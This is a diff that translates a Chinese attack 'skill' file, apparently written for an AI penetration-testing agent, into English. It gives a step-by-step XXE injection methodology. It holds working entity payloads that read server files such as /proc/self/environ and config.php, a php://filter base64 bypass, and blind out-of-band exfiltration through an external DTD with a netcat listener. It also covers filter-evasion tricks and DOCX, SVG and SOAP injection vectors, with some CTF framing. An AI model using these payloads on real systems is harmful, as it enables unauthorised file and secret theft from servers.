@@ -1,28 +1,31 @@
 ---
 name: xxe-injection-methodology
-description: "XML外部实体注入(XXE)的检测与利用方法论。当目标有 XML 解析、SOAP API、文件上传（DOCX/XLSX/SVG）、或任何接受 XML 输入的端点时使用。包含基础文件读取、盲 XXE 外带（参数实体+外部DTD）、SVG/DOCX XXE、SOAP Envelope XXE、JSON→XML 转换攻击。即使 API 文档说只接受 JSON，也应尝试 XML Content-Type 测试隐式 XXE。"
+description: "Detection and exploitation methodology for XML external entity injection (XXE). Use when the target has XML parsing, SOAP APIs, file uploads (DOCX/XLSX/SVG), or any endpoint that accepts XML input. Includes basic file read, blind XXE out-of-band exfiltration (parameter entities + external DTD), SVG/DOCX XXE, SOAP Envelope XXE, JSON→XML conversion attacks. Even if the API documentation says it only accepts JSON, you should still try XML Content-Type to test for implicit XXE."
+zh-signals: "XML 外部实体注入的检测与利用方法，覆盖盲 XXE、SVG/DOCX 与 SOAP。信号:XXE,XML外部实体,盲XXE,DTD,文件读取"
+when-to-use: >-
+  Use when a target parses XML, exposes SOAP APIs, accepts DOCX/XLSX/SVG uploads, or may accept XML content types for implicit XXE testing.
 metadata:
-  tags: "xxe,xml,xml external entity,blind-xxe,dtd,soap,svg,docx,file-read,oob,parameter-entity,application/xml,text/xml,DOCTYPE,ENTITY,外部实体,xml解析,Content-Type: xml"
+  tags: "xxe,xml,xml external entity,blind-xxe,dtd,soap,svg,docx,file-read,oob,parameter-entity,application/xml,text/xml,DOCTYPE,ENTITY,external entity,xml parsing,Content-Type: xml"
   category: "exploit"
 ---
 
-# XXE 注入攻击方法论
+# XXE Injection Attack Methodology
 
-## 深入参考
+## Further Reading
 
-- XXE 文件读取、盲 XXE 外带、SVG/DOCX XXE、SOAP XXE 完整 payload → [references/xxe-exploitation.md](references/xxe-exploitation.md)
-- XXE 高级技术（盲注/OOB/文件上传/XInclude/编码绕过） → [references/xxe-advanced.md](references/xxe-advanced.md)
+- Full payloads for XXE file read, blind XXE OOB exfiltration, SVG/DOCX XXE, and SOAP XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
+- XXE advanced techniques (blind injection/OOB/file upload/XInclude/encoding bypass) → [references/xxe-advanced.md](references/xxe-advanced.md)
 
 ---
 
-## Phase 1: 发现 XXE 入口
+## Phase 1: Discover XXE Entry Points
 
-- Content-Type: `application/xml` 或 `text/xml` 的端点
-- **将 JSON 请求改为 XML**：即使端点接受 JSON，也尝试发 XML（很多后端同时支持两种格式）
-- 文件上传（DOCX, XLSX, SVG 都是 XML 格式）
-- SOAP API（URL 含 `/ws/`、`/soap/`、`/wsdl/`）
+- Endpoints with Content-Type: `application/xml` or `text/xml`
+- **Switch JSON requests to XML**: even if the endpoint accepts JSON, try sending XML (many backends support both formats)
+- File uploads (DOCX, XLSX, and SVG are all XML formats)
+- SOAP APIs (URL contains `/ws/`, `/soap/`, `/wsdl/`)
 
-## Phase 2: 基础 XXE 文件读取
+## Phase 2: Basic XXE File Read
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -30,9 +33,9 @@ metadata:
 <root><data>&xxe;</data></root>
 ```
 
-**关键**：`&xxe;` 必须放在会被回显的 XML 元素里！
+**Key**: `&xxe;` must be placed inside an XML element that will be echoed back!
 
-### 常见目标文件
+### Common Target Files
 
 ```
 file:///flag.txt
@@ -43,29 +46,29 @@ file:///app/app.py
 file:///proc/self/environ
 ```
 
-## Phase 3: 利用决策树
+## Phase 3: Exploitation Decision Tree
 
 ```
-XXE 入口确认
-├─ SOAP 端点？ → XXE 必须嵌入 SOAP Envelope！→ [references/xxe-exploitation.md](references/xxe-exploitation.md)
-├─ 有回显？ → 直接 ENTITY file:/// 读文件
-├─ 无回显？ → 盲 XXE 参数实体 + 外部 DTD 外带
-│  └─ 用 bash 运行 `python3 -m http.server` 或 `nc -lvp PORT` 接收 OOB 回调
+XXE entry point confirmed
+├─ SOAP endpoint? → XXE must be embedded in the SOAP Envelope! → [references/xxe-exploitation.md](references/xxe-exploitation.md)
+├─ Output reflected? → read files directly with ENTITY file:///
+├─ No output? → blind XXE with parameter entities + external DTD for OOB exfiltration
+│  └─ Use bash to run `python3 -m http.server` or `nc -lvp PORT` to receive the OOB callback
 │  └─ [references/xxe-exploitation.md](references/xxe-exploitation.md)
-├─ PHP 目标？ → php://filter/convert.base64-encode 绕过 XML 特殊字符
-└─ 文件上传入口？ → SVG/DOCX XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
+├─ PHP target? → php://filter/convert.base64-encode bypass for XML special characters
+└─ File upload entry point? → SVG/DOCX XXE → [references/xxe-exploitation.md](references/xxe-exploitation.md)
 ```
 
-## Phase 4: PHP 特殊技巧
+## Phase 4: PHP Special Techniques
 
-PHP 文件含 `<` 等特殊字符会破坏 XML 解析，使用 php://filter base64 编码绕过：
+PHP files containing special characters such as `<` break XML parsing; use php://filter base64 encoding to bypass:
 ```xml
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/app/config.php">
 ```
 
-## Phase 5: JSON → XML 转换攻击
+## Phase 5: JSON → XML Conversion Attack
 
-有些后端同时支持 JSON 和 XML，解析器自动选择格式：
+Some backends support both JSON and XML, and the parser auto-selects the format:
 
 ```
 Content-Type: application/xml
@@ -76,36 +79,36 @@ Content-Type: application/xml
 <root><username>&xxe;</username><password>test</password></root>
 ```
 
-即使文档说 JSON，也尝试 XML Content-Type，可能存在隐式支持。
+Even if the documentation says JSON, try the XML Content-Type — there may be implicit support.
 
-## XXE 防御绕过
+## XXE Defense Bypass
 
-- `<!DOCTYPE>` 被过滤 → 尝试 UTF-16 编码
-- `ENTITY` 被过滤 → 尝试参数实体 `%xxe;`
-- `SYSTEM` 被过滤 → 尝试 `PUBLIC "x" "file:///flag"`
+- `<!DOCTYPE>` is filtered → try UTF-16 encoding
+- `ENTITY` is filtered → try a parameter entity `%xxe;`
+- `SYSTEM` is filtered → try `PUBLIC "x" "file:///flag"`
 
-## 注意事项
+## Notes
 
-- **XXE 本质上包含 SSRF**：`SYSTEM "http://..."` 就是服务端请求
-- **XML 解析器差异**：Python lxml 默认禁用外部实体；Java 老版本默认启用
-- **盲 XXE 需要外部服务器**：参数实体外带需要你控制一台服务器接收数据
+- **XXE inherently includes SSRF**: `SYSTEM "http://..."` is a server-side request
+- **XML parser differences**: Python lxml disables external entities by default; older Java versions enable them by default
+- **Blind XXE requires an external server**: parameter entity OOB exfiltration requires you to control a server that receives the data
 
 ---
 
-## CTF XXE 技巧补充
+## CTF XXE Technique Supplements
 
-### DOCX/Office XML 上传 XXE
-DOCX 是 ZIP 包含 XML，修改 `[Content_Types].xml` 注入 XXE：
+### DOCX/Office XML Upload XXE
+DOCX is a ZIP containing XML; modify `[Content_Types].xml` to inject the XXE:
 ```bash
 unzip template.docx
-# 编辑 [Content_Types].xml 添加 DOCTYPE + ENTITY
+# Edit [Content_Types].xml to add DOCTYPE + ENTITY
 zip -r exploit.docx . 
-# 上传后服务端解析 XML 时触发 XXE
+# Upload, then the server-side XML parse triggers the XXE
 ```
 
-### XML 注入点扩展
-除了常规请求体，检查这些注入点：
-- `X-Forwarded-For` 等 Header 被写入 XML 日志时
-- SVG 文件上传（SVG 是 XML）
-- SOAP/SAML 端点
-- RSS/Atom feed 输入
+### XML Injection Point Expansion
+Besides the usual request body, check these injection points:
+- Headers such as `X-Forwarded-For` being written into XML logs
+- SVG file uploads (SVG is XML)
+- SOAP/SAML endpoints
+- RSS/Atom feed input
